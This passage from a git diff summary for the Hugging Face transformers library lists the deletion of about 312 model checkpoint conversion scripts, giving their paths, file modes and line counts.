 ...rt_mbart_original_checkpoint_to_pytorch.py |   83 --
 .../convert_megatron_bert_checkpoint.py       |  334 -----
 .../convert_megatron_gpt2_checkpoint.py       |  358 -----
 .../convert_mimi_checkpoint_to_pytorch.py     |  198 ---
 .../mistral/convert_mistral_weights_to_hf.py  |  282 ----
 .../convert_mistral3_weights_to_hf.py         |  241 ---
 .../mixtral/convert_mixtral_weights_to_hf.py  |  244 ---
 .../mllama/convert_mllama_weights_to_hf.py    |  639 --------
 ..._original_pytorch_checkpoint_to_pytorch.py |  229 ---
 ...ebert_original_tf_checkpoint_to_pytorch.py |   58 -
 ...nvert_original_tf_checkpoint_to_pytorch.py |  141 --
 ...nvert_original_tf_checkpoint_to_pytorch.py |  177 ---
 .../mobilevit/convert_mlcvnets_to_pytorch.py  |  311 ----
 .../convert_mlcvnets_to_pytorch.py            |  332 -----
 .../moonshine/convert_usefulsensors_to_hf.py  |  169 ---
 .../moshi/convert_moshi_transformers.py       |  311 ----
 .../mra/convert_mra_pytorch_to_pytorch.py     |  110 --
 .../musicgen/convert_musicgen_transformers.py |  236 ---
 .../convert_musicgen_melody_transformers.py   |  267 ----
 ..._myt5_original_tf_checkpoint_to_pytorch.py |   60 -
 .../nemotron/convert_nemotron_nemo_to_hf.py   |  346 -----
 ..._sharded_original_checkpoint_to_pytorch.py |  161 --
 .../models/nougat/convert_nougat_to_hf.py     |  282 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  111 --
 .../models/olmo/convert_olmo_weights_to_hf.py |  248 ---
 .../olmo2/convert_olmo2_weights_to_hf.py      |  306 ----
 .../olmoe/convert_olmoe_weights_to_hf.py      |  281 ----
 .../omdet_turbo/convert_omdet_turbo_to_hf.py  |  349 -----
 .../oneformer/convert_to_hf_oneformer.py      | 1191 ---------------
 ...penai_original_tf_checkpoint_to_pytorch.py |   74 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  113 --
 .../models/owlv2/convert_owlv2_to_hf.py       |  422 ------
 .../convert_owlvit_original_flax_to_hf.py     |  406 -----
 .../convert_paligemma2_weights_to_hf.py       |  415 ------
 .../convert_paligemma_weights_to_hf.py        |  347 -----
 .../pegasus/convert_pegasus_tf_to_pytorch.py  |  131 --
 .../convert_perceiver_haiku_to_pytorch.py     |  468 ------
 .../convert_persimmon_weights_to_hf.py        |  129 --
 .../models/phi/convert_phi_weights_to_hf.py   |  207 ---
 .../convert_phi4_multimodal_weights_to_hf.py  |  229 ---
 ...nvert_pix2struct_original_pytorch_to_hf.py |  155 --
 .../pixtral/convert_pixtral_weights_to_hf.py  |  246 ---
 ...ert_plbart_original_checkpoint_to_torch.py |   94 --
 .../convert_poolformer_original_to_pytorch.py |  214 ---
 .../convert_pop2piano_weights_to_hf.py        |  190 ---
 .../convert_prompt_depth_anything_to_hf.py    |  292 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  159 --
 .../models/pvt/convert_pvt_to_pytorch.py      |  226 ---
 .../pvt_v2/convert_pvt_v2_to_pytorch.py       |  294 ----
 .../convert_recurrent_gemma_to_hf.py          |  222 ---
 ...ert_reformer_trax_checkpoint_to_pytorch.py |  226 ---
 .../convert_regnet_seer_10b_to_pytorch.py     |  308 ----
 .../regnet/convert_regnet_to_pytorch.py       |  458 ------
 ...onvert_rembert_tf_checkpoint_to_pytorch.py |   62 -
 .../resnet/convert_resnet_to_pytorch.py       |  199 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  177 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 ...ormer_original_tf_checkpoint_to_pytorch.py |   62 -
 ..._detr_original_pytorch_checkpoint_to_hf.py |  782 ----------
 .../convert_rt_detr_v2_weights_to_hf.py       |  363 -----
 .../rwkv/convert_rwkv_checkpoint_to_hf.py     |  209 ---
 .../models/sam/convert_sam_to_hf.py           |  251 ----
 .../seamless_m4t/convert_fairseq2_to_hf.py    |  396 -----
 .../seamless_m4t_v2/convert_fairseq2_to_hf.py |  404 -----
 .../convert_segformer_original_to_pytorch.py  |  387 -----
 .../models/seggpt/convert_seggpt_to_hf.py     |  221 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  305 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  317 ----
 ...onvert_shieldgemma2_weights_orbax_to_hf.py |  470 ------
 .../models/siglip/convert_siglip_to_hf.py     |  533 -------
 .../models/siglip2/convert_siglip2_to_hf.py   |  438 ------
 ...rt_wav2vec2_seq2seq_original_to_pytorch.py |  357 -----
 ...xt_wav2vec2_seq2seq_original_to_pytorch.py |  316 ----
 .../convert_s2t_fairseq_to_tfms.py            |  121 --
 .../models/speecht5/convert_hifigan.py        |  108 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  401 -----
 .../superglue/convert_superglue_to_hf.py      |  342 -----
 .../convert_superpoint_to_pytorch.py          |  175 ---
 .../convert_swiftformer_original_to_hf.py     |  175 ---
 .../swin/convert_swin_simmim_to_pytorch.py    |  182 ---
 .../swin/convert_swin_timm_to_pytorch.py      |  173 ---
 .../convert_swin2sr_original_to_pytorch.py    |  278 ----
 .../swinv2/convert_swinv2_timm_to_pytorch.py  |  219 ---
 .../switch_transformers/convert_big_switch.py |  194 ---
 ...ers_original_flax_checkpoint_to_pytorch.py |  203 ---
 ...rt_t5_original_tf_checkpoint_to_pytorch.py |   59 -
 .../t5/convert_t5x_checkpoint_to_flax.py      |  235 ---
 .../t5/convert_t5x_checkpoint_to_pytorch.py   |  238 ---
 .../convert_table_transformer_to_hf.py        |  317 ----
 ...convert_table_transformer_to_hf_no_timm.py |  434 ------
 ...tapas_original_tf_checkpoint_to_pytorch.py |  137 --
 .../models/textnet/convert_textnet_to_hf.py   |  208 ---
 .../convert_timesformer_to_pytorch.py         |  253 ----
 .../trocr/convert_trocr_unilm_to_pytorch.py   |  237 ---
 .../models/udop/convert_udop_to_hf.py         |  224 ---
 .../convert_umt5_checkpoint_to_pytorch.py     |  274 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  273 ----
 ...ch_original_s3prl_checkpoint_to_pytorch.py |  109 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  224 ---
 .../models/univnet/convert_univnet.py         |  162 --
 .../convert_convnext_upernet_to_pytorch.py    |  214 ---
 .../convert_swin_upernet_to_pytorch.py        |  297 ----
 .../convert_video_llava_weights_to_hf.py      |  159 --
 .../videomae/convert_videomae_to_pytorch.py   |  324 ----
 .../vilt/convert_vilt_original_to_pytorch.py  |  299 ----
 .../convert_vipllava_weights_to_hf.py         |  132 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  149 --
 .../models/vit/convert_dino_to_pytorch.py     |  218 ---
 .../models/vit/convert_vit_timm_to_pytorch.py |  254 ----
 .../vit_mae/convert_vit_mae_to_pytorch.py     |  178 ---
 .../models/vit_msn/convert_msn_to_pytorch.py  |  245 ---
 .../models/vitmatte/convert_vitmatte_to_hf.py |  170 ---
 .../models/vitpose/convert_vitpose_to_hf.py   |  428 ------
 .../vits/convert_original_checkpoint.py       |  390 -----
 .../vivit/convert_vivit_flax_to_pytorch.py    |  231 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  385 -----
 ...c2_original_s3prl_checkpoint_to_pytorch.py |  109 --
 .../convert_wav2vec2_seamless_checkpoint.py   |  217 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  309 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  206 ---
 ...lm_original_s3prl_checkpoint_to_pytorch.py |  109 --
 .../models/whisper/convert_openai_to_hf.py    |  370 -----
 .../convert_x_clip_original_pytorch_to_hf.py  |  386 -----
 .../convert_xglm_original_ckpt_to_trfms.py    |   68 -
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  183 ---
 ...xlnet_original_tf_checkpoint_to_pytorch.py |  113 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  212 ---
 .../models/yolos/convert_yolos_to_pytorch.py  |  267 ----
 .../yoso/convert_yoso_pytorch_to_pytorch.py   |  108 --
 .../models/zoedepth/convert_zoedepth_to_hf.py |  426 ------
 312 files changed, 53 insertions(+), 66972 deletions(-)
 delete mode 100644 src/transformers/models/albert/convert_albert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/align/convert_align_tf_to_hf.py
 delete mode 100644 src/transformers/models/aria/convert_aria_weights_to_hf.py
 delete mode 100644 src/transformers/models/audio_spectrogram_transformer/convert_audio_spectrogram_transformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/bamba/convert_mamba_ssm_checkpoint.py
 delete mode 100644 src/transformers/models/bark/convert_suno_to_hf.py
 delete mode 100644 src/transformers/models/bart/convert_bart_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/beit/convert_beit_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/bert/convert_bert_original_tf2_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/bert/convert_bert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bert/convert_bert_pytorch_checkpoint_to_original_tf.py
 delete mode 100644 src/transformers/models/bert/convert_bert_token_dropping_original_tf2_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/big_bird/convert_bigbird_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bigbird_pegasus/convert_bigbird_pegasus_tf_to_pytorch.py
 delete mode 100755 src/transformers/models/biogpt/convert_biogpt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bit/convert_bit_to_pytorch.py
 delete mode 100644 src/transformers/models/blenderbot/convert_blenderbot_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/blip/convert_blip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/blip_2/convert_blip_2_original_to_pytorch.py
 delete mode 100644 src/transformers/models/bloom/convert_bloom_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bros/convert_bros_to_pytorch.py
 delete mode 100755 src/transformers/models/byt5/convert_byt5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/canine/convert_canine_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/chameleon/convert_chameleon_weights_to_hf.py
 delete mode 100644 src/transformers/models/chinese_clip/convert_chinese_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clap/convert_clap_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clip/convert_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clipseg/convert_clipseg_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clvp/convert_clvp_to_hf.py
 delete mode 100644 src/transformers/models/colpali/convert_colpali_weights_to_hf.py
 delete mode 100644 src/transformers/models/conditional_detr/convert_conditional_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/convbert/convert_convbert_original_tf1_checkpoint_to_pytorch_and_tf2.py
 delete mode 100644 src/transformers/models/convnext/convert_convnext_to_pytorch.py
 delete mode 100644 src/transformers/models/convnextv2/convert_convnextv2_to_pytorch.py
 delete mode 100644 src/transformers/models/cvt/convert_cvt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dab_detr/convert_dab_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dac/convert_dac_checkpoint.py
 delete mode 100644 src/transformers/models/data2vec/convert_data2vec_audio_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/data2vec/convert_data2vec_text_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/data2vec/convert_data2vec_vision_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deformable_detr/convert_deformable_detr_to_pytorch.py
 delete mode 100644 src/transformers/models/deit/convert_deit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/bort/convert_bort_original_gluonnlp_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/deta/convert_deta_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/deta/convert_deta_swin_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/efficientformer/convert_efficientformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/gptsan_japanese/convert_gptsan_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/jukebox/convert_jukebox.py
 delete mode 100644 src/transformers/models/deprecated/mega/convert_mega_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/trajectory_transformer/convert_trajectory_transformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/transfo_xl/convert_transfo_xl_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/van/convert_van_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/vit_hybrid/convert_vit_hybrid_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/depth_anything/convert_depth_anything_to_hf.py
 delete mode 100644 src/transformers/models/depth_anything/convert_distill_any_depth_to_hf.py
 delete mode 100644 src/transformers/models/depth_pro/convert_depth_pro_weights_to_hf.py
 delete mode 100644 src/transformers/models/detr/convert_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/detr/convert_detr_to_pytorch.py
 delete mode 100644 src/transformers/models/dialogpt/convert_dialogpt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dinov2/convert_dinov2_to_hf.py
 delete mode 100644 src/transformers/models/dinov2_with_registers/convert_dinov2_with_registers_to_hf.py
 delete mode 100644 src/transformers/models/dit/convert_dit_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/donut/convert_donut_to_pytorch.py
 delete mode 100644 src/transformers/models/dpr/convert_dpr_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dpt/convert_dinov2_depth_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_beit_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_hybrid_to_pytorch.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_swinv2_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_to_pytorch.py
 delete mode 100644 src/transformers/models/efficientnet/convert_efficientnet_to_pytorch.py
 delete mode 100644 src/transformers/models/electra/convert_electra_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/emu3/convert_emu3_weights_to_hf.py
 delete mode 100644 src/transformers/models/encodec/convert_encodec_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/esm/convert_esm.py
 delete mode 100644 src/transformers/models/falcon/convert_custom_code_checkpoint.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_fastspeech2_conformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_hifigan.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_model_with_hifigan.py
 delete mode 100644 src/transformers/models/flava/convert_dalle_to_flava_codebook.py
 delete mode 100644 src/transformers/models/flava/convert_flava_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/fnet/convert_fnet_original_flax_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/focalnet/convert_focalnet_to_hf_format.py
 delete mode 100755 src/transformers/models/fsmt/convert_fsmt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/funnel/convert_funnel_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/fuyu/convert_fuyu_model_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma/convert_gemma_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma2/convert_gemma2_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma3/convert_gemma3_weights_orbax_to_hf.py
 delete mode 100644 src/transformers/models/git/convert_git_to_pytorch.py
 delete mode 100644 src/transformers/models/glm/convert_glm_weights_to_hf.py
 delete mode 100644 src/transformers/models/glpn/convert_glpn_to_pytorch.py
 delete mode 100644 src/transformers/models/got_ocr2/convert_got_ocr2_weights_to_hf.py
 delete mode 100755 src/transformers/models/gpt2/convert_gpt2_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/gpt_neo/convert_gpt_neo_mesh_tf_to_pytorch.py
 delete mode 100644 src/transformers/models/gpt_sw3/convert_megatron_to_pytorch.py
 delete mode 100644 src/transformers/models/grounding_dino/convert_grounding_dino_to_hf.py
 delete mode 100644 src/transformers/models/groupvit/convert_groupvit_nvlab_to_hf.py
 delete mode 100644 src/transformers/models/hiera/convert_hiera_to_hf.py
 delete mode 100644 src/transformers/models/hubert/convert_distilhubert_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/hubert/convert_hubert_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/hubert/convert_hubert_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/idefics2/convert_idefics2_weights_to_hf.py
 delete mode 100644 src/transformers/models/idefics3/convert_idefics3_weights_to_hf.py
 delete mode 100644 src/transformers/models/ijepa/convert_ijepa_to_hf.py
 delete mode 100644 src/transformers/models/imagegpt/convert_imagegpt_original_tf2_to_pytorch.py
 delete mode 100644 src/transformers/models/instructblip/convert_instructblip_original_to_pytorch.py
 delete mode 100644 src/transformers/models/instructblipvideo/convert_instructblipvideo_original_to_pytorch.py
 delete mode 100644 src/transformers/models/kosmos2/convert_kosmos2_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/levit/convert_levit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/llama/convert_llama_weights_to_hf.py
 delete mode 100644 src/transformers/models/llama4/convert_llama4_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava/convert_llava_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_next/convert_llava_next_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_next_video/convert_llava_next_video_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_onevision/convert_llava_onevision_weights_to_hf.py
 delete mode 100644 src/transformers/models/longformer/convert_longformer_original_pytorch_lightning_to_pytorch.py
 delete mode 100644 src/transformers/models/longt5/convert_longt5x_checkpoint_to_flax.py
 delete mode 100644 src/transformers/models/luke/convert_luke_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/lxmert/convert_lxmert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/m2m_100/convert_m2m100_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mamba/convert_mamba_ssm_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mamba2/convert_mamba2_ssm_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/marian/convert_marian_tatoeba_to_pytorch.py
 delete mode 100644 src/transformers/models/marian/convert_marian_to_pytorch.py
 delete mode 100644 src/transformers/models/mask2former/convert_mask2former_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_swin_to_pytorch.py
 delete mode 100644 src/transformers/models/mbart/convert_mbart_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/megatron_bert/convert_megatron_bert_checkpoint.py
 delete mode 100644 src/transformers/models/megatron_gpt2/convert_megatron_gpt2_checkpoint.py
 delete mode 100644 src/transformers/models/mimi/convert_mimi_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mistral/convert_mistral_weights_to_hf.py
 delete mode 100644 src/transformers/models/mistral3/convert_mistral3_weights_to_hf.py
 delete mode 100644 src/transformers/models/mixtral/convert_mixtral_weights_to_hf.py
 delete mode 100644 src/transformers/models/mllama/convert_mllama_weights_to_hf.py
 delete mode 100644 src/transformers/models/mluke/convert_mluke_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilebert/convert_mobilebert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilenet_v1/convert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilenet_v2/convert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilevit/convert_mlcvnets_to_pytorch.py
 delete mode 100644 src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py
 delete mode 100644 src/transformers/models/moonshine/convert_usefulsensors_to_hf.py
 delete mode 100644 src/transformers/models/moshi/convert_moshi_transformers.py
 delete mode 100644 src/transformers/models/mra/convert_mra_pytorch_to_pytorch.py
 delete mode 100644 src/transformers/models/musicgen/convert_musicgen_transformers.py
 delete mode 100644 src/transformers/models/musicgen_melody/convert_musicgen_melody_transformers.py
 delete mode 100644 src/transformers/models/myt5/convert_myt5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/nemotron/convert_nemotron_nemo_to_hf.py
 delete mode 100644 src/transformers/models/nllb_moe/convert_nllb_moe_sharded_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/nougat/convert_nougat_to_hf.py
 delete mode 100644 src/transformers/models/nystromformer/convert_nystromformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/olmo/convert_olmo_weights_to_hf.py
 delete mode 100644 src/transformers/models/olmo2/convert_olmo2_weights_to_hf.py
 delete mode 100644 src/transformers/models/olmoe/convert_olmoe_weights_to_hf.py
 delete mode 100644 src/transformers/models/omdet_turbo/convert_omdet_turbo_to_hf.py
 delete mode 100644 src/transformers/models/oneformer/convert_to_hf_oneformer.py
 delete mode 100755 src/transformers/models/openai/convert_openai_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/opt/convert_opt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/owlv2/convert_owlv2_to_hf.py
 delete mode 100644 src/transformers/models/owlvit/convert_owlvit_original_flax_to_hf.py
 delete mode 100644 src/transformers/models/paligemma/convert_paligemma2_weights_to_hf.py
 delete mode 100644 src/transformers/models/paligemma/convert_paligemma_weights_to_hf.py
 delete mode 100644 src/transformers/models/pegasus/convert_pegasus_tf_to_pytorch.py
 delete mode 100644 src/transformers/models/perceiver/convert_perceiver_haiku_to_pytorch.py
 delete mode 100644 src/transformers/models/persimmon/convert_persimmon_weights_to_hf.py
 delete mode 100644 src/transformers/models/phi/convert_phi_weights_to_hf.py
 delete mode 100644 src/transformers/models/phi4_multimodal/convert_phi4_multimodal_weights_to_hf.py
 delete mode 100644 src/transformers/models/pix2struct/convert_pix2struct_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/pixtral/convert_pixtral_weights_to_hf.py
 delete mode 100644 src/transformers/models/plbart/convert_plbart_original_checkpoint_to_torch.py
 delete mode 100644 src/transformers/models/poolformer/convert_poolformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/pop2piano/convert_pop2piano_weights_to_hf.py
 delete mode 100644 src/transformers/models/prompt_depth_anything/convert_prompt_depth_anything_to_hf.py
 delete mode 100644 src/transformers/models/prophetnet/convert_prophetnet_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/pvt/convert_pvt_to_pytorch.py
 delete mode 100644 src/transformers/models/pvt_v2/convert_pvt_v2_to_pytorch.py
 delete mode 100644 src/transformers/models/recurrent_gemma/convert_recurrent_gemma_to_hf.py
 delete mode 100755 src/transformers/models/reformer/convert_reformer_trax_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/regnet/convert_regnet_seer_10b_to_pytorch.py
 delete mode 100644 src/transformers/models/regnet/convert_regnet_to_pytorch.py
 delete mode 100755 src/transformers/models/rembert/convert_rembert_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/resnet/convert_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/roberta/convert_roberta_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/roberta_prelayernorm/convert_roberta_prelayernorm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/roformer/convert_roformer_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/rt_detr/convert_rt_detr_original_pytorch_checkpoint_to_hf.py
 delete mode 100644 src/transformers/models/rt_detr_v2/convert_rt_detr_v2_weights_to_hf.py
 delete mode 100644 src/transformers/models/rwkv/convert_rwkv_checkpoint_to_hf.py
 delete mode 100644 src/transformers/models/sam/convert_sam_to_hf.py
 delete mode 100644 src/transformers/models/seamless_m4t/convert_fairseq2_to_hf.py
 delete mode 100644 src/transformers/models/seamless_m4t_v2/convert_fairseq2_to_hf.py
 delete mode 100644 src/transformers/models/segformer/convert_segformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/seggpt/convert_seggpt_to_hf.py
 delete mode 100644 src/transformers/models/sew/convert_sew_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/sew_d/convert_sew_d_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/shieldgemma2/convert_shieldgemma2_weights_orbax_to_hf.py
 delete mode 100644 src/transformers/models/siglip/convert_siglip_to_hf.py
 delete mode 100644 src/transformers/models/siglip2/convert_siglip2_to_hf.py
 delete mode 100644 src/transformers/models/speech_encoder_decoder/convert_mbart_wav2vec2_seq2seq_original_to_pytorch.py
 delete mode 100644 src/transformers/models/speech_encoder_decoder/convert_speech_to_text_wav2vec2_seq2seq_original_to_pytorch.py
 delete mode 100644 src/transformers/models/speech_to_text/convert_s2t_fairseq_to_tfms.py
 delete mode 100644 src/transformers/models/speecht5/convert_hifigan.py
 delete mode 100644 src/transformers/models/speecht5/convert_speecht5_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/superglue/convert_superglue_to_hf.py
 delete mode 100644 src/transformers/models/superpoint/convert_superpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/swiftformer/convert_swiftformer_original_to_hf.py
 delete mode 100644 src/transformers/models/swin/convert_swin_simmim_to_pytorch.py
 delete mode 100644 src/transformers/models/swin/convert_swin_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/swin2sr/convert_swin2sr_original_to_pytorch.py
 delete mode 100644 src/transformers/models/swinv2/convert_swinv2_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/switch_transformers/convert_big_switch.py
 delete mode 100644 src/transformers/models/switch_transformers/convert_switch_transformers_original_flax_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/t5/convert_t5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/t5/convert_t5x_checkpoint_to_flax.py
 delete mode 100755 src/transformers/models/t5/convert_t5x_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/table_transformer/convert_table_transformer_to_hf.py
 delete mode 100644 src/transformers/models/table_transformer/convert_table_transformer_to_hf_no_timm.py
 delete mode 100644 src/transformers/models/tapas/convert_tapas_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/textnet/convert_textnet_to_hf.py
 delete mode 100644 src/transformers/models/timesformer/convert_timesformer_to_pytorch.py
 delete mode 100644 src/transformers/models/trocr/convert_trocr_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/udop/convert_udop_to_hf.py
 delete mode 100644 src/transformers/models/umt5/convert_umt5_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech/convert_unispeech_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech_sat/convert_unispeech_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/unispeech_sat/convert_unispeech_sat_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/univnet/convert_univnet.py
 delete mode 100644 src/transformers/models/upernet/convert_convnext_upernet_to_pytorch.py
 delete mode 100644 src/transformers/models/upernet/convert_swin_upernet_to_pytorch.py
 delete mode 100644 src/transformers/models/video_llava/convert_video_llava_weights_to_hf.py
 delete mode 100644 src/transformers/models/videomae/convert_videomae_to_pytorch.py
 delete mode 100644 src/transformers/models/vilt/convert_vilt_original_to_pytorch.py
 delete mode 100644 src/transformers/models/vipllava/convert_vipllava_weights_to_hf.py
 delete mode 100644 src/transformers/models/visual_bert/convert_visual_bert_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/vit/convert_dino_to_pytorch.py
 delete mode 100644 src/transformers/models/vit/convert_vit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/vit_mae/convert_vit_mae_to_pytorch.py
 delete mode 100644 src/transformers/models/vit_msn/convert_msn_to_pytorch.py
 delete mode 100644 src/transformers/models/vitmatte/convert_vitmatte_to_hf.py
 delete mode 100644 src/transformers/models/vitpose/convert_vitpose_to_hf.py
 delete mode 100644 src/transformers/models/vits/convert_original_checkpoint.py
 delete mode 100644 src/transformers/models/vivit/convert_vivit_flax_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2/convert_wav2vec2_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2/convert_wav2vec2_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wav2vec2_bert/convert_wav2vec2_seamless_checkpoint.py
 delete mode 100644 src/transformers/models/wav2vec2_conformer/convert_wav2vec2_conformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/wavlm/convert_wavlm_original_pytorch_checkpoint_to_pytorch.py
